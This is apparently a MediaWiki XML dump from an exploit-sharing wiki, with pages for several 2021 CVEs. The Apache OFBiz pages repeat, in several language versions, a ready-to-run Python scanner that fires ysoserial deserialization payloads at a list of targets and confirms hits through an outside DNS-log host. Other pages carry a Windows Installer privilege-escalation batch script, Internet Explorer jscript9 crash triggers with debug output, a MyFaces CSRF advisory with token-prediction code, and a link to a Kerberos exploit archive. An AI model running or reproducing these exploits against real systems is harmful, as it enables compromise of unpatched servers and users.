    id = requests.get("https://dns.xn--9tr.com/new_gen").text.split(".")[0]
    if(not os.path.exists("target.txt")):
        exit("put url in target.txt! ")
    if(not os.path.exists("ysoserial.jar")):
        exit("where is ysoserial.jar?")
    with open("target.txt")as f:
        urls = f.readlines()
    for url in urls:
        url = url.strip()
        uid = uuid.uuid1().hex
        cmd = "java -jar .\ysoserial.jar URLDNS http://{0}.{1}.y.dns1.tk &gt; tmp".format(uid,id)
        r = os.popen(cmd)   
        r.close()  
        with open("tmp",'rb') as f:
            payload = binascii.hexlify(f.read())
        data = '''
        &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; 
            &lt;soapenv:Header/&gt;
            &lt;soapenv:Body&gt;
            &lt;ser&gt;
        &lt;map-HashMap&gt;
            &lt;map-Entry&gt;
                &lt;map-Key&gt;
                    &lt;cus-obj&gt;{0}&lt;/cus-obj&gt;
                &lt;/map-Key&gt;
                &lt;map-Value&gt;
                    &lt;std-String value="http://baidu.com"/&gt;
                &lt;/map-Value&gt;
            &lt;/map-Entry&gt;
        &lt;/map-HashMap&gt;
            &lt;/ser&gt;
            &lt;/soapenv:Body&gt;
            &lt;/soapenv:Envelope&gt;
            '''.format(payload.decode())
        headers = {
            "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
        }
        url = url+"/webtools/control/SOAPService"
        try:
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
        except:
            pass
        dnslogresurl = "https://dns.xn--9tr.com/"+id
        if(uid in requests.get(dnslogresurl).text):
            print("[+] {0} 漏洞存在".format(url))
        else:
            print("[-] {0} 漏洞不存在".format(url))
    print("[+] 请到 {0} 查看结果".format(dnslogresurl))

if __name__ == "__main__":
    main()
&lt;/pre&gt;</text>
      <sha1>2t0hvl6phbzva12qp6gleri1sy9q459</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26295 Apache OFBiz RMI反序列化漏洞/fr</title>
    <ns>0</ns>
    <id>688</id>
    <revision>
      <id>922</id>
      <timestamp>2021-04-03T02:40:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Impact de la vulnérabilité =="</comment>
      <origin>922</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2275" sha1="qwwla6eagofxiesbl4l0fipdu7yjhzt" xml:space="preserve">&lt;languages /&gt;
== Impact de la vulnérabilité ==

Apache OFBiz &lt; 17.12.06


==POC==
&lt;pre&gt;
#coding:utf-8
import binascii
import os
import requests
import urllib3
import uuid
urllib3.disable_warnings()
def main():
    id = requests.get("https://dns.xn--9tr.com/new_gen").text.split(".")[0]
    if(not os.path.exists("target.txt")):
        exit("put url in target.txt! ")
    if(not os.path.exists("ysoserial.jar")):
        exit("where is ysoserial.jar?")
    with open("target.txt")as f:
        urls = f.readlines()
    for url in urls:
        url = url.strip()
        uid = uuid.uuid1().hex
        cmd = "java -jar .\ysoserial.jar URLDNS http://{0}.{1}.y.dns1.tk &gt; tmp".format(uid,id)
        r = os.popen(cmd)   
        r.close()  
        with open("tmp",'rb') as f:
            payload = binascii.hexlify(f.read())
        data = '''
        &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; 
            &lt;soapenv:Header/&gt;
            &lt;soapenv:Body&gt;
            &lt;ser&gt;
        &lt;map-HashMap&gt;
            &lt;map-Entry&gt;
                &lt;map-Key&gt;
                    &lt;cus-obj&gt;{0}&lt;/cus-obj&gt;
                &lt;/map-Key&gt;
                &lt;map-Value&gt;
                    &lt;std-String value="http://baidu.com"/&gt;
                &lt;/map-Value&gt;
            &lt;/map-Entry&gt;
        &lt;/map-HashMap&gt;
            &lt;/ser&gt;
            &lt;/soapenv:Body&gt;
            &lt;/soapenv:Envelope&gt;
            '''.format(payload.decode())
        headers = {
            "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
        }
        url = url+"/webtools/control/SOAPService"
        try:
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
        except:
            pass
        dnslogresurl = "https://dns.xn--9tr.com/"+id
        if(uid in requests.get(dnslogresurl).text):
            print("[+] {0} 漏洞存在".format(url))
        else:
            print("[-] {0} 漏洞不存在".format(url))
    print("[+] 请到 {0} 查看结果".format(dnslogresurl))

if __name__ == "__main__":
    main()
&lt;/pre&gt;</text>
      <sha1>qwwla6eagofxiesbl4l0fipdu7yjhzt</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26295 Apache OFBiz RMI反序列化漏洞/ru</title>
    <ns>0</ns>
    <id>1443</id>
    <revision>
      <id>1815</id>
      <timestamp>2021-04-20T08:06:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Воздействие уязвимости=="</comment>
      <origin>1815</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2288" sha1="cy7uop0oevif18zg6h6d0ipfqa145ey" xml:space="preserve">&lt;languages /&gt;
==Воздействие уязвимости==

Apache OFBiz &lt; 17.12.06


==POC==
&lt;pre&gt;
#coding:utf-8
import binascii
import os
import requests
import urllib3
import uuid
urllib3.disable_warnings()
def main():
    id = requests.get("https://dns.xn--9tr.com/new_gen").text.split(".")[0]
    if(not os.path.exists("target.txt")):
        exit("put url in target.txt! ")
    if(not os.path.exists("ysoserial.jar")):
        exit("where is ysoserial.jar?")
    with open("target.txt")as f:
        urls = f.readlines()
    for url in urls:
        url = url.strip()
        uid = uuid.uuid1().hex
        cmd = "java -jar .\ysoserial.jar URLDNS http://{0}.{1}.y.dns1.tk &gt; tmp".format(uid,id)
        r = os.popen(cmd)   
        r.close()  
        with open("tmp",'rb') as f:
            payload = binascii.hexlify(f.read())
        data = '''
        &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; 
            &lt;soapenv:Header/&gt;
            &lt;soapenv:Body&gt;
            &lt;ser&gt;
        &lt;map-HashMap&gt;
            &lt;map-Entry&gt;
                &lt;map-Key&gt;
                    &lt;cus-obj&gt;{0}&lt;/cus-obj&gt;
                &lt;/map-Key&gt;
                &lt;map-Value&gt;
                    &lt;std-String value="http://baidu.com"/&gt;
                &lt;/map-Value&gt;
            &lt;/map-Entry&gt;
        &lt;/map-HashMap&gt;
            &lt;/ser&gt;
            &lt;/soapenv:Body&gt;
            &lt;/soapenv:Envelope&gt;
            '''.format(payload.decode())
        headers = {
            "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
        }
        url = url+"/webtools/control/SOAPService"
        try:
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
        except:
            pass
        dnslogresurl = "https://dns.xn--9tr.com/"+id
        if(uid in requests.get(dnslogresurl).text):
            print("[+] {0} 漏洞存在".format(url))
        else:
            print("[-] {0} 漏洞不存在".format(url))
    print("[+] 请到 {0} 查看结果".format(dnslogresurl))

if __name__ == "__main__":
    main()
&lt;/pre&gt;</text>
      <sha1>cy7uop0oevif18zg6h6d0ipfqa145ey</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26295 Apache OFBiz RMI反序列化漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3086</id>
    <revision>
      <id>3586</id>
      <timestamp>2021-05-26T17:43:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響=="</comment>
      <origin>3586</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2257" sha1="lnhwy1cg866ypchhcx6j2y8t88qdfib" xml:space="preserve">&lt;languages /&gt;
==漏洞影響==

Apache OFBiz &lt; 17.12.06


==POC==
&lt;pre&gt;
#coding:utf-8
import binascii
import os
import requests
import urllib3
import uuid
urllib3.disable_warnings()
def main():
    id = requests.get("https://dns.xn--9tr.com/new_gen").text.split(".")[0]
    if(not os.path.exists("target.txt")):
        exit("put url in target.txt! ")
    if(not os.path.exists("ysoserial.jar")):
        exit("where is ysoserial.jar?")
    with open("target.txt")as f:
        urls = f.readlines()
    for url in urls:
        url = url.strip()
        uid = uuid.uuid1().hex
        cmd = "java -jar .\ysoserial.jar URLDNS http://{0}.{1}.y.dns1.tk &gt; tmp".format(uid,id)
        r = os.popen(cmd)   
        r.close()  
        with open("tmp",'rb') as f:
            payload = binascii.hexlify(f.read())
        data = '''
        &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; 
            &lt;soapenv:Header/&gt;
            &lt;soapenv:Body&gt;
            &lt;ser&gt;
        &lt;map-HashMap&gt;
            &lt;map-Entry&gt;
                &lt;map-Key&gt;
                    &lt;cus-obj&gt;{0}&lt;/cus-obj&gt;
                &lt;/map-Key&gt;
                &lt;map-Value&gt;
                    &lt;std-String value="http://baidu.com"/&gt;
                &lt;/map-Value&gt;
            &lt;/map-Entry&gt;
        &lt;/map-HashMap&gt;
            &lt;/ser&gt;
            &lt;/soapenv:Body&gt;
            &lt;/soapenv:Envelope&gt;
            '''.format(payload.decode())
        headers = {
            "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
        }
        url = url+"/webtools/control/SOAPService"
        try:
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
            requests.post(url,data=data,verify=False,headers=headers,timeout=5)
        except:
            pass
        dnslogresurl = "https://dns.xn--9tr.com/"+id
        if(uid in requests.get(dnslogresurl).text):
            print("[+] {0} 漏洞存在".format(url))
        else:
            print("[-] {0} 漏洞不存在".format(url))
    print("[+] 请到 {0} 查看结果".format(dnslogresurl))

if __name__ == "__main__":
    main()
&lt;/pre&gt;</text>
      <sha1>lnhwy1cg866ypchhcx6j2y8t88qdfib</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26296 Apache MyFaces 2.x 跨站請求偽造漏洞</title>
    <ns>0</ns>
    <id>3125</id>
    <revision>
      <id>3628</id>
      <timestamp>2021-05-30T02:49:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~                Ceritude Securiy Advisory - CSA-2021-001                   ~ ~ ~ ~ ~ ~ ~ ~..."</comment>
      <origin>3628</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8862" sha1="7gxfe4clwxxl9fp744hifwydeu33dda" xml:space="preserve">&lt;pre&gt;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~                Ceritude Securiy Advisory - CSA-2021-001                   ~
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
 PRODUCT          : Apache MyFaces
 VENDOR           : The Apache Software Foundation
 SEVERITY         : High
 AFFECTED VERSION : &lt;=2.2.13, &lt;=2.3.7, &lt;=2.3-next-M4, &lt;=2.1 branches
 IDENTIFIERS      : CVE-2021-26296
 PATCH VERSION    : 2.2.14, 2.3.8, 2.3-next-M5, 3.0.0
 FOUND BY         : Wolfgang Ettlinger, Certitude Lab
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Introduction
------------

Apache MyFaces is an open-source implementation of JSF. During a quick
evaluation, Certitude found that the default CSRF protection of Apache MyFaces
was insufficient as the CSRF tokens the framework generates can be guessed by
an attacker.

Moreover, the patch provided by the Apache MyFaces maintainers affects the way
channel tokens for websocket communication are generated. It is unclear,
whether this change fixes a vulnerability.

Vulnerability Overview
----------------------

Applications that employ the MyFaces JSF framework transmit a parameter
"javax.faces.ViewState" with every state-modifying request. Though not
intended for CSRF protection, in the default configuration this parameter
prevents trivial attacks, as it is sufficiently long and tied to a single
session.

However, by default, this value is generated using the insecure random number
generator `java.util.Random`. An attacker can therefore obtain a ViewState
parameter from the application and, based on this value, predict the random
part of ViewState parameters subsequently issued to other users. Besides the
random string, the ViewState parameter contains a sequence number. As the
initial value of the per-session sequence counter is 1, an attacker can very
easily guess this value.

As the ViewState parameter is the sole CSRF protection, knowledge of this
value allows an attacker to conduct CSRF attacks.

When Apache MyFaces is used in client-side saving mode, the ViewState
parameter is insufficient to protect against CSRF. Instead, pages that require
protection against CSRF can be marked as "protected-pages". For these pages,
Apache MyFaces requires CSRF token for each request ("javax.faces.Token"). By
default, the CSRF token too is generated using `java.util.Random`, thus
allowing an attacker to bypass the CSRF protection.

NOTE: Besides the ViewState parameter and the CSRF token, Apache MyFaces also
introduced a cryptographically secure random number generator for the
websocket channel token. Certitude has not verified if this change fixes a
vulnerability.

Proof of Concept
----------------

By default, the class
`org.apache.myfaces.application.viewstate.RandomKeyFactory` is used to
generate ViewState parameter values. This class uses the method
`java.util.Random#nextBytes` as well as a per-session counter value to
generate ViewState strings.

The following JavaScript snippet demonstrates the generation of the random
part of a ViewState value based on the random part of a previously issued
ViewState parameter:

``` {.javascript}
const multiplier = 0x5DEECE66Dn;
const addend = 0xBn;
const mask = (1n &lt;&lt; 48n) - 1n;

const unbyte = (bytes, offset) =&gt; BigInt(
    Array.from(bytes.slice(offset, offset + 4))
    .map((b, i) =&gt; b &lt;&lt; (8 * i))
    .reduce((a, b) =&gt; a + b));

const longify = n =&gt; integer(n, 8n);
const intify = n =&gt; integer(n, 4n);
const byteify = n =&gt; integer(n, 1n);

function integer(n, len) {
    const bits = len * 8n;
    const hspan = 1n &lt;&lt; (bits - 1n);
    return ((n + hspan) % (2n * hspan)) - hspan;
}

const hexToByteArray = s =&gt; (new Uint8Array(s.length / 2)
    .map((_, i) =&gt; (
        parseInt(s.charAt(2 * i), 16) &lt;&lt; 4 |
        parseInt(s.charAt(2 * i + 1), 16))));

const byteArrayToHex = b =&gt; (Array.from(b)
    .map(x =&gt; (((x + 0x100).toString(16)).substr(-2)))
    .reduce((a, b) =&gt; a + b))
    .toUpperCase();

// based on https://github.com/fta2012/ReplicatedRandom/blob/master/ReplicatedRandom.java
function replicatedRandom(bytes) {
    let seed = 0;

    replicateState(
        unbyte(bytes, bytes.length - 8), 32n,
        unbyte(bytes, bytes.length - 4), 32n);

    return nextBytes(bytes.length);

    function replicateState(nextN, n, nextM, m) {
        const upperMOf48Mask = ((1n &lt;&lt; m) - 1n) &lt;&lt; (48n - m);
        const oldSeedUpperN = (nextN &lt;&lt; (48n - n)) &amp; mask;
        const newSeedUpperM = (nextM &lt;&lt; (48n - m)) &amp; mask;

        let possibilityCount = 0;

        for (let oldSeed = oldSeedUpperN;
                oldSeed &lt;= (oldSeedUpperN | ((1n &lt;&lt; (48n - n)) - 1n));
                oldSeed++) {
            const newSeed = longify(
                longify(oldSeed * multiplier + addend) &amp; mask);

            if ((newSeed &amp; upperMOf48Mask) == newSeedUpperM) {
                possibilityCount++;
                seed = newSeed;
            }
        }

        if (possibilityCount != 1) throw new Error('replicateState failed');
    }

    function next(bits) {
        seed = longify(longify(seed * multiplier + addend) &amp; mask);
        return intify(seed &gt;&gt; (48n - bits));
    }

    function nextBytes(count) {
        const res = new Int8Array(count);

        for (let i = 0; i &lt; count; ) {
            let rnd = next(32n);
            for (let n = Math.min(count - i, 4); n &gt; 0; n--) {
                res[i++] = parseInt(byteify(rnd));
                rnd &gt;&gt;= 8n;
            }
        }

        return res;
    }
}
```

An attacker can exploit this issue as follows:

1.  An attacker lures an authenticated victim to an attacker-controlled
    website.
2.  As the victim opens the website, the attacker requests a ViewState value
    from the application.
3.  The exploit script opens the target JSF page e.g. in an iframe. For this
    page, the vulnerable application generates a new random ViewState value.
4.  The attacker now predicts a number of the random strings based on the
    ViewState value received in step 2. As the victim's ViewState value is
    generated just after the attacker's ViewState value, it is very likely,
    that the victim's ViewState value is among the generated ones.
5.  The exploit script sends several CSRF requests containing combinations of
    predicted random strings and sequence numbers. If guessed correctly, the
    vulnerable application accepts the attacker's request.

A similar approach is possible to attack protected pages. Unlike the ViewState
values, the CSRF token generated, however, do not contain a sequence counter.

Resolution
----------

The Apache MyFaces maintainers have released a patch that addresses the
identified issue. Certitude recommends affected organizations to immediately
upgrade to version 2.2.14, 2.3.8, 2.3-next-M5 or 3.0.0. If an upgrade to the
latest version is not possible, the Apache MyFaces maintainers recommend
setting the following settings to "secureRandom":

-   org.apache.myfaces.RANDOM_KEY_IN_VIEW_STATE_SESSION_TOKEN
-   org.apache.myfaces.RANDOM_KEY_IN_CSRF_SESSION_TOKEN
-   org.apache.myfaces.RANDOM_KEY_IN_WEBSOCKET_SESSION_TOKEN

Note that the patch introduces changes in the way websocket channel tokens are
generated. Certitude therefore recommends applying the patch or workaround to
all applications that use Apache MyFaces, even if CSRF attacks are of no
concern.

Timeline
--------

  ---------------------------------------------------------------------------
  Date         Text
  ------------ --------------------------------------------------------------
  2020-12-15   Sending encrypted vulnerability description and proof of
               concept script to the Apache security team

  2020-12-15   Apache security team acknowledges receipt

  2020-12-28   Apache MyFaces team member requests proof of concept script

  2021-01-04   Asking for encrypted communication channel

  2021-01-04   Vendor provides PGP key

  2021-01-05   Sending encrypted proof of concept

  2021-01-07   Vendor requests more information about the PoC

  2021-01-08   Providing requested information

  2021-01-19   Coordination call with vendor

  2021-01-26   Coordination call with vendor

  2021-02-02   Coordination call with vendor, release of patches is imminent

  2021-02-09   Coordination call with vendor, 3 of 4 patches have been
               released

  2021-02-15   Coordination call with vendor, last patch release is in
               progress

  2021-02-19   Public release of the advisory
  ---------------------------------------------------------------------------

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                           (c) 2021 Certitude Consulting GmbH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

&lt;/pre&gt;</text>
      <sha1>7gxfe4clwxxl9fp744hifwydeu33dda</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26414&amp;CVE-2021-31962 Windows Kerberos AppContainer 企業身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>4691</id>
    <revision>
      <id>5393</id>
      <timestamp>2021-06-20T02:10:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞描述== &lt;/translate&gt; &lt;translate&gt; Kerberos支持安全緩衝區來設置票證的目標SPN，繞過LSASS中的SPN檢查。 &lt;/translate&gt;  &lt;tra..."</comment>
      <origin>5393</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="288" sha1="mfe8yazxyyql80luk42px0x60qraws2" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞描述==
&lt;/translate&gt;
&lt;translate&gt;
Kerberos支持安全緩衝區來設置票證的目標SPN，繞過LSASS中的SPN檢查。
&lt;/translate&gt;

&lt;translate&gt;
==漏洞相關文件==
&lt;/translate&gt;
https://github.com/JustYoomoon/Exploit/blob/main/GS20210617182302.tgz</text>
      <sha1>mfe8yazxyyql80luk42px0x60qraws2</sha1>
    </revision>
    <revision>
      <id>5394</id>
      <parentid>5393</parentid>
      <timestamp>2021-06-20T02:10:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5394</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="321" sha1="q0f7g7pytelwlhnokqn0w8vh8d2wk1x" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞描述== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:2--&gt;
Kerberos支持安全緩衝區來設置票證的目標SPN，繞過LSASS中的SPN檢查。
&lt;/translate&gt;

&lt;translate&gt;
==漏洞相關文件== &lt;!--T:3--&gt;
&lt;/translate&gt;
https://github.com/JustYoomoon/Exploit/blob/main/GS20210617182302.tgz</text>
      <sha1>q0f7g7pytelwlhnokqn0w8vh8d2wk1x</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26414&amp;CVE-2021-31962 Windows Kerberos AppContainer 企業身份驗證繞過漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4700</id>
    <revision>
      <id>5404</id>
      <timestamp>2021-06-20T02:11:53Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-26414&amp;CVE-2021-31962 Windows Kerberos AppContainer 企业身份验证绕过漏洞"</comment>
      <origin>5404</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="213" sha1="qf3vbs8xrq88hdjp2p7p8rql3v4e5cl" xml:space="preserve">&lt;languages /&gt;
==漏洞描述==
Kerberos支持安全缓冲区来设置票证的目标SPN，绕过LSASS中的SPN检查。

==漏洞相关文件==
https://github.com/JustYoomoon/Exploit/blob/main/GS20210617182302.tgz</text>
      <sha1>qf3vbs8xrq88hdjp2p7p8rql3v4e5cl</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26415 Windows Installer 特權提升漏洞</title>
    <ns>0</ns>
    <id>1483</id>
    <revision>
      <id>1860</id>
      <timestamp>2021-04-22T03:02:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; @echo off REM Put BaitAndSwitch, example.msi into C:\temp echo &gt; C:\temp\fakelog.txt start C:\temp\BaitAndSwitch C:\temp\linkdir\link C:\temp\fakelog.txt C:\Wind..."</comment>
      <origin>1860</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="310" sha1="awnegwb6abohh8zewoakoen4w7twb8q" xml:space="preserve">==POC==
&lt;pre&gt;
@echo off
REM Put BaitAndSwitch, example.msi into C:\temp
echo &gt; C:\temp\fakelog.txt
start C:\temp\BaitAndSwitch C:\temp\linkdir\link C:\temp\fakelog.txt C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1
timeout /t 1
msiexec /j C:\temp\example.msi /t ksz /Li! C:\temp\linkdir\link /qn
&lt;/pre&gt;</text>
      <sha1>awnegwb6abohh8zewoakoen4w7twb8q</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26419 Internet Explorer jscript9.dll 內存損壞漏洞</title>
    <ns>0</ns>
    <id>2371</id>
    <revision>
      <id>2853</id>
      <timestamp>2021-05-14T01:54:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; Internet Explorer: Memory corruption in jscript9.dll related to scope of the arguments object  There is a vulnerability in jscript9 that could be potentially use..."</comment>
      <origin>2853</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7023" sha1="kvxcz34egylekrnejge4nuny3wkthn4" xml:space="preserve">==EXP==
&lt;pre&gt;
Internet Explorer: Memory corruption in jscript9.dll related to scope of the arguments object

There is a vulnerability in jscript9 that could be potentially used by an attacker to execute arbitrary code when viewing attacker-controlled website in Internet Explorer. The vulnerability has been confirmed on Windows 10 64-bit with the latest security patches applied.

The following minimal sample is sufficient to trigger the bug:

############################################################

&lt;!-- saved from url=(0014)about:internet --&gt;
&lt;script&gt;

function main() {
  function v4(v5,v6) {
    with ({}) {
      arguments();
    }
  }
  for(var i=0; i &lt;1; i++) v4(1);
}
alert('start');
main();
alert('end');

&lt;/script&gt;

############################################################

When this sample is opened with Internet Explorer, it crashes inside jscript9!Js::JavascriptFunction::CallFunction&lt;1&gt; when dereferencing memory pointed to by eax.

jscript9!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x39:
68c2d6e9 8bb850020000    mov     edi,dword ptr [eax+250h] ds:002b:00000250=????????

On the first glance, it might look like a null pointer dereference, however the value of eax in this case was read from uninitialized memory. There are also different ways to trigger the crash when accessing the arguments object. The following sample demonstrates a crash when reading from a controllable address:

############################################################

 &lt;!-- saved from url=(0014)about:internet --&gt;
&lt;script&gt;

function test() {
  test.caller.arguments.length = (0x13371337&gt;&gt;1);
}

function main() {
  function v4(v5,v6) {
    test();
    with ({}) {
      arguments.length;
      arguments();
    }
  }
  for(var i=0; i &lt;1; i++) v4(1);
}
alert('start');
main();
alert('end');

&lt;/script&gt;

############################################################

This sample crashes in Js::JavascriptOperators::GetProperty_Internal when dereferencing address 0x13371337+40h:

jscript9!Js::JavascriptOperators::GetProperty_Internal&lt;0&gt;+0x35:
68b578b5 8b7840          mov     edi,dword ptr [eax+40h] ds:002b:13371377=????????

The value read this way is used as a function pointer, thus demonstrating the vulnerability could be used for code execution.

I haven't done the full root cause analysis (it will be easier to do with proper debug tooling for jscript9), but in both cases, the operations on 'arguments' object end up being performed on incorrect data. I suspect this is related to changing the scope, e.g. accessing an object at an incorrect stack slot due to scope change. Another possibility could be an incorrectly initialized arguments object or the corresponding local variable.

Full debug log:

############################################################

(1654.14e8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=13371337 ebx=0910bbe0 ecx=0910bbe0 edx=0910bbe0 esi=092b8240 edi=00000000
eip=68b578b5 esp=053bc578 ebp=053bc590 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
jscript9!Js::JavascriptOperators::GetProperty_Internal&lt;0&gt;+0x35:
68b578b5 8b7840          mov     edi,dword ptr [eax+40h] ds:002b:13371377=????????

0:009&gt; k
 # ChildEBP RetAddr  
00 053bc590 68b69075 jscript9!Js::JavascriptOperators::GetProperty_Internal&lt;0&gt;+0x35
01 053bc5dc 68b9d19d jscript9!Js::InterpreterStackFrame::OP_ProfiledLdLen&lt;Js::OpLayoutReg2_OneByte&gt;+0x1f5
02 053bc608 68b9c102 jscript9!Js::InterpreterStackFrame::Process+0x7fd
03 053bc744 0b9a0fd9 jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;+0x242
WARNING: Frame IP not in any known module. Following frames may be wrong.
04 053bc750 68c2d743 0xb9a0fd9
05 053bc798 68b9ff61 jscript9!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x93
06 053bc7c8 68b9cb53 jscript9!Js::InterpreterStackFrame::OP_ProfiledCallI&lt;Js::OpLayoutCallI_OneByte&gt;+0x121
07 053bc7f8 68b9c102 jscript9!Js::InterpreterStackFrame::Process+0x1b3
08 053bc934 0b9a0fe1 jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;+0x242
09 053bc940 68c2d743 0xb9a0fe1
0a 053bc988 68b9ff61 jscript9!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x93
0b 053bc9b8 68b9cb53 jscript9!Js::InterpreterStackFrame::OP_ProfiledCallI&lt;Js::OpLayoutCallI_OneByte&gt;+0x121
0c 053bc9e8 68b9c102 jscript9!Js::InterpreterStackFrame::Process+0x1b3
0d 053bcb14 0b9a0fe9 jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;+0x242
0e 053bcb20 68c2d743 0xb9a0fe9
0f 053bcb60 68b4eca9 jscript9!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x93
10 053bcbd4 68b4ebbc jscript9!Js::JavascriptFunction::CallRootFunctionInternal+0xb5
11 053bcc2c 68b4eb56 jscript9!Js::JavascriptFunction::CallRootFunction+0x4d
12 053bcc74 68b4eabd jscript9!ScriptSite::CallRootFunction+0x42
13 053bccb0 68b5256e jscript9!ScriptSite::Execute+0xae
14 053bcd48 68b4e9aa jscript9!ScriptEngine::ExecutePendingScripts+0x1bf
15 053bcde0 68c27cca jscript9!ScriptEngine::ParseScriptTextCore+0x32c
16 053bce30 695a9cc1 jscript9!ScriptEngine::ParseScriptText+0x5a
17 053bce68 694a0493 MSHTML!InitializeLocalHtmlEngine+0x1f11
18 053bcec0 694b7fe7 MSHTML!GetWebPlatformObject+0x16c93
19 053bcf30 694b8493 MSHTML!GetWebPlatformObject+0x2e7e7
1a 053bd01c 694b87be MSHTML!GetWebPlatformObject+0x2ec93
1b 053bd098 694b8146 MSHTML!GetWebPlatformObject+0x2efbe
1c 053bd0b8 694d79d9 MSHTML!GetWebPlatformObject+0x2e946
1d 053bd110 694d6bb9 MSHTML!UninitializeLocalHtmlEngine+0x8b49
1e 053bd134 694d653e MSHTML!UninitializeLocalHtmlEngine+0x7d29
1f 053bd25c 695d4891 MSHTML!UninitializeLocalHtmlEngine+0x76ae
20 053bd27c 695d47fb MSHTML!DllGetClassObject+0x7291
21 053bd29c 695d478d MSHTML!DllGetClassObject+0x71fb
